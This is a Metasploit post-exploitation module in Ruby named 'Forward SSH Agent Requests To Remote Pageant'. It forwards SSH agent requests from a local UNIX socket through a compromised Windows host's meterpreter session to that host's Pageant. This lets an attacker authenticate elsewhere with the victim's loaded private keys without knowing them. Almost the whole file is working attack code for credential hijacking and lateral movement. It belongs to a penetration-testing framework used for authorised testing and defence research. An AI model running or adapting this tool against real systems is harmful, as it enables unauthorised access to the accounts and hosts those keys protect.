##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'tmpdir'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ExtAPI
  include Msf::Post::Windows::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Forward SSH Agent Requests To Remote Pageant',
        'Description' => %q{
          This module forwards SSH agent requests from a local socket to a remote Pageant instance.
          If a target Windows machine is compromised and is running Pageant, this will allow the
          attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are
          tunneled through the meterpreter session. This could therefore be used to authenticate
          with a remote host using a private key which is loaded into a remote user's Pageant instance,
          without ever having knowledge of the private key itself.

          Note that this requires the PageantJacker meterpreter extension, but this will be automatically
          loaded into the remote meterpreter session by this module if it is not already loaded.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',
          'Ben Campbell', # A HUGE amount of support in this :-)
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              extapi_pageant_send_query
            ]
          }
        }
      )
    )
    register_options([
      OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil])
    ])
  end

  def sockpath
    @sockpath ||= "#{Dir.tmpdir}/#{Rex::Text.rand_text_alphanumeric(8)}"
  end

  def run
    # Check to ensure that UNIX sockets are supported
    begin
      ::UNIXServer
    rescue NameError
      fail_with(Failure::BadConfig, 'This module is only supported on a Metasploit installation that supports UNIX sockets.')
    end

    unless session.commands.include?(Rex::Post::Meterpreter::Extensions::Extapi::COMMAND_ID_EXTAPI_PAGEANT_SEND_QUERY)
      fail_with(Failure::BadConfig, 'Session does not support Meterpreter ExtAPI Pageant queries')
    end

    # Get the socket path from the user supplied options (or leave it blank to get the plugin to choose one)
    if datastore['SocketPath']
      # Quit if the file exists, so that we don't accidentally overwrite something important on the host system
      if ::File.exist?(datastore['SocketPath'].to_s)
        fail_with(Failure::BadConfig, "Socket (#{datastore['SocketPath']}) already exists. Remove it or choose another path and try again.")
      end
      @sockpath = datastore['SocketPath'].to_s
    end

    # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.
    ::UNIXServer.open(sockpath) do |serv|
      File.chmod(0o0700, sockpath)

      print_status("Launched listening socket on #{sockpath}")
      print_status("Set SSH_AUTH_SOCK variable to #{sockpath} (e.g. export SSH_AUTH_SOCK=\"#{sockpath}\")")
      print_status('Now use any SSH tool normally (e.g. ssh-add)')

      while (s = serv.accept)
        begin
          while (socket_request_data = s.recvfrom(8192)) # 8192 = AGENT_MAX
            break if socket_request_data.nil?

            data = socket_request_data.first

            break if data.nil? || data.empty?

            vprint_status("PageantJacker: Received data from socket (size: #{data.size})")

            response = session.extapi.pageant.forward(data, data.size)

            unless response[:success]
              print_error("PageantJacker: Unsuccessful response received (#{translate_error(response[:error])})")
              next
            end

            vprint_status("PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')")

            begin
              s.send(response[:blob], 0)
            rescue StandardError
              break
            end
          end
        rescue Errno::ECONNRESET
          vprint_status('PageantJacker: Received reset from client, ignoring.')
        end
      end
    end
  end

  def cleanup
    return unless @sockpath

    # Remove the socket that we created, if it still exists
    ::File.delete(@sockpath) if ::File.exist?(@sockpath)
  ensure
    super
  end

  def translate_error(errnum)
    errstring = "#{errnum}: "
    case errnum
    when 0
      errstring + 'No error'
    when 1
      errstring + 'The Pageant request was not processed.'
    when 2
      errstring + 'Unable to obtain IPC memory address.'
    when 3
      errstring + 'Unable to allocate memory for Pageant<-->Meterpreter IPC.'
    when 4
      errstring + 'Unable to allocate memory buffer.'
    when 5
      errstring + 'Unable to build Pageant request string.'
    when 6
      errstring + 'Pageant not found.'
    when 7
      errstring + 'Not forwarded.'
    else
      errstring + 'Unknown.'
    end
  end
end
